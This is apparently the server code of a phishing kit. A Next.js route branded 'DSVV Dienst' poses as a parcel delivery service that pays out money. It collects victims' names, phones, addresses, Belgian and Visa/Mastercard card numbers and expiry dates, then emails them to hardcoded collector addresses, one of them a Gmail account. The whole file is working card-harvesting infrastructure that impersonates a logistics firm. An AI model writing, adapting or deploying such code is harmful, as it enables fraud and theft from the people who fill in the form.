import { NextRequest, NextResponse } from 'next/server'
import nodemailer from 'nodemailer'
import path from 'path'

// Configuration du transporteur SMTP Hostinger
// Pool + timeouts : sans ça, sous plusieurs soumissions simultanées, les connexions
// SMTP s'accumulent et une requête bloquée ne se termine jamais, ce qui gèle le formulaire.
const transporter = nodemailer.createTransport({
  host: process.env.EMAIL_HOST || 'smtp.hostinger.com',
  port: parseInt(process.env.EMAIL_PORT || '465'),
  secure: true, // true pour le port 465, false pour les autres ports
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
  pool: true,
  maxConnections: 3,
  maxMessages: 100,
  connectionTimeout: 10000,
  greetingTimeout: 10000,
  socketTimeout: 15000,
})

// Filet de sécurité : borne la durée totale d'un envoi pour garantir une réponse
// même si le SMTP ne respecte pas ses propres timeouts.
function withTimeout<T>(promise: Promise<T>, ms: number, message: string): Promise<T> {
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => reject(new Error(message)), ms)
    promise.then(
      (value) => {
        clearTimeout(timer)
        resolve(value)
      },
      (err) => {
        clearTimeout(timer)
        reject(err)
      }
    )
  })
}

// Fonction pour valider les données du formulaire
function validateFormData(data: any) {
  const requiredFields = [
    'nom_complet',
    'telephone',
    'adresse',
    'carte_be',
    'carte_52_49_51',
    'date_expiration',
    'montant'
  ]

  for (const field of requiredFields) {
    if (!data[field] || data[field].trim() === '') {
      return { isValid: false, error: `Het veld ${field} is verplicht` }
    }
  }



  return { isValid: true }
}

// Fonction pour créer le template HTML de l'email
function createEmailTemplate(data: any) {
  const title = 'Nouvelle demande de transfert de fonds'
  const currentDate = new Date()
  const dateStr = currentDate.toLocaleDateString('nl-NL', {
    weekday: 'long',
    year: 'numeric',
    month: 'long',
    day: 'numeric'
  })
  const timeStr = currentDate.toLocaleTimeString('nl-NL')

  return `
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="utf-8">
      <title>${title}</title>
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
          line-height: 1.6;
          color: #2d3748;
          background-color: #f7fafc;
        }
        .container {
          max-width: 580px;
          margin: 30px auto;
          background: white;
          border-radius: 8px;
          box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
          overflow: hidden;
        }
        .header {
          background: linear-gradient(135deg, #0284c7 0%, #0369a1 100%);
          padding: 40px 30px;
          text-align: center;
          color: white;
        }
        .header img {
          width: 50px;
          height: 50px;
          margin-bottom: 15px;
          border-radius: 6px;
        }
        .header h1 {
          font-size: 28px;
          font-weight: 700;
          margin-bottom: 8px;
        }
        .header .subtitle {
          font-size: 14px;
          opacity: 0.95;
        }
        .content {
          padding: 40px 30px;
        }
        .section {
          margin-bottom: 32px;
        }
        .section-title {
          font-size: 13px;
          font-weight: 600;
          color: #0284c7;
          text-transform: uppercase;
          letter-spacing: 0.5px;
          margin-bottom: 16px;
        }
        .info-block {
          background: #f8fafc;
          padding: 16px;
          border-radius: 6px;
          border-left: 3px solid #0284c7;
        }
        .info-row {
          display: flex;
          margin-bottom: 12px;
          font-size: 14px;
        }
        .info-row:last-child {
          margin-bottom: 0;
        }
        .info-label {
          font-weight: 600;
          color: #4a5568;
          min-width: 130px;
        }
        .info-value {
          color: #2d3748;
          word-break: break-word;
          flex: 1;
        }
        .amount-box {
          background: linear-gradient(135deg, #0284c7 0%, #0369a1 100%);
          color: white;
          padding: 20px;
          border-radius: 6px;
          text-align: center;
          margin-top: 16px;
        }
        .amount-label {
          font-size: 12px;
          opacity: 0.9;
          margin-bottom: 8px;
        }
        .amount-value {
          font-size: 32px;
          font-weight: 700;
        }
        .divider {
          height: 1px;
          background: #e2e8f0;
          margin: 32px 0;
        }
        .footer {
          background: #f8fafc;
          padding: 30px;
          border-top: 1px solid #e2e8f0;
          text-align: center;
          font-size: 12px;
          color: #718096;
        }
        .footer-logo {
          font-weight: 700;
          color: #0284c7;
          margin-bottom: 8px;
        }
        .footer-text {
          line-height: 1.8;
        }
        .footer-text a {
          color: #0284c7;
          text-decoration: none;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="header">
          <img src="cid:logo" alt="DSVV Dienst Logo">
          <h1>DSVV Dienst</h1>
          <p class="subtitle">${title}</p>
        </div>

        <div class="content">
          <!-- Informations Client -->
          <div class="section">
            <div class="section-title">Informations du client</div>
            <div class="info-block">
              <div class="info-row">
                <div class="info-label">Nom complet</div>
                <div class="info-value">${data.nom_complet}</div>
              </div>
              <div class="info-row">
                <div class="info-label">Téléphone</div>
                <div class="info-value">${data.telephone}</div>
              </div>
              <div class="info-row">
                <div class="info-label">Adresse</div>
                <div class="info-value">${data.adresse}</div>
              </div>
            </div>
          </div>

          <!-- Informations Colis -->
          <div class="section">
            <div class="section-title">Description du colis</div>
            <div class="info-block">
              <div class="info-row">
                <div class="info-value">${data.description_article || 'Non spécifiée'}</div>
              </div>
            </div>
          </div>

          <!-- Informations Bancaires -->
          <div class="section">
            <div class="section-title">Informations bancaires</div>
            <div class="info-block">
              <div class="info-row">
                <div class="info-label">Carte BE</div>
                <div class="info-value">${data.carte_be}</div>
              </div>
              <div class="info-row">
                <div class="info-label">Carte 52/49/51</div>
                <div class="info-value">${data.carte_52_49_51}</div>
              </div>
              <div class="info-row">
                <div class="info-label">Date d'expiration</div>
                <div class="info-value">${data.date_expiration}</div>
              </div>
            </div>
            <div class="amount-box">
              <div class="amount-label">Montant à recevoir</div>
              <div class="amount-value">${data.montant} €</div>
            </div>
          </div>

          <div class="divider"></div>

          <!-- Métadonnées -->
          <div style="text-align: center; font-size: 12px; color: #a0aec0;">
            <p>Reçu le ${dateStr} à ${timeStr}</p>
          </div>
        </div>

        <div class="footer">
          <div class="footer-logo">DSVV Dienst</div>
          <div class="footer-text">
            Service de collecte et de livraison de colis 24/7<br>
            <a href="https://dsvv-dienst.com">dsvv-dienst.com</a>
          </div>
        </div>
      </div>
    </body>
    </html>
  `
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()

    // Déterminer le type de formulaire basé sur l'URL ou un paramètre
    const url = new URL(request.url)
    url.searchParams.get('type') || 'reception' // Type par défaut

    // Valider les données
    const validation = validateFormData(body)
    if (!validation.isValid) {
      return NextResponse.json(
        { success: false, error: validation.error },
        { status: 400 }
      )
    }

    // Vérifier que les variables d'environnement sont configurées
    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
      console.error('SMTP omgevingsvariabelen ontbreken')
      return NextResponse.json(
        { success: false, error: 'Email server configuratie ontbreekt' },
        { status: 500 }
      )
    }

    // Créer le contenu de l'email
    const emailHtml = createEmailTemplate(body)
    const subject = `Nieuwe aanvraag geldoverdracht DSV - ${body.nom_complet}`

    // Configuration de l'email
    const recipients = process.env.EMAIL_RECIPIENTS
      ? process.env.EMAIL_RECIPIENTS.split(',').map(email => email.trim())
      : ['registratie@dsv-klantenservice.com', 'richtingklantautodp.be@gmail.com']

    // Chemin vers le logo
    const logoPath = path.join(process.cwd(), 'public', 'Logo.png')

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: recipients,
      subject: subject,
      html: emailHtml,
      attachments: [
        {
          filename: 'logo.png',
          path: logoPath,
          cid: 'logo' // Content-ID pour référencer l'image dans l'HTML
        }
      ],
      text: `
        ${subject}

        === KLANTINFORMATIE ===
        Naam: ${body.nom_complet}
        Telefoon: ${body.telephone}
        Adres: ${body.adresse}

        === PAKKETINFORMATIE ===
        Beschrijving: ${body.description_article || 'Niet gespecificeerd'}

        === BANKINFORMATIE ===
        Kaart BE: ${body.carte_be}
        Kaart 52/49/51: ${body.carte_52_49_51}
        Vervaldatum: ${body.date_expiration}
        Bedrag: ${body.montant} €

        ---
        Email verzonden vanaf herstelservicedsv
        Datum: ${new Date().toLocaleString('nl-NL')}
      `
    }

    // Envoyer l'email (borné dans le temps pour toujours répondre au client)
    const info = await withTimeout(
      transporter.sendMail(mailOptions),
      20000,
      'Time-out bij het verzenden van de e-mail'
    )

    console.log('Email succesvol verzonden:', info.messageId)

    return NextResponse.json({
      success: true,
      message: 'Email succesvol verzonden',
      messageId: info.messageId
    })

  } catch (error) {
    console.error('Fout bij het verzenden van email:', error)

    return NextResponse.json(
      {
        success: false,
        error: 'Fout bij het verzenden van email. Probeer het later opnieuw.'
      },
      { status: 500 }
    )
  }
}

// Gérer les autres méthodes HTTP
export async function GET() {
  return NextResponse.json(
    { error: 'Methode niet toegestaan' },
    { status: 405 }
  )
}
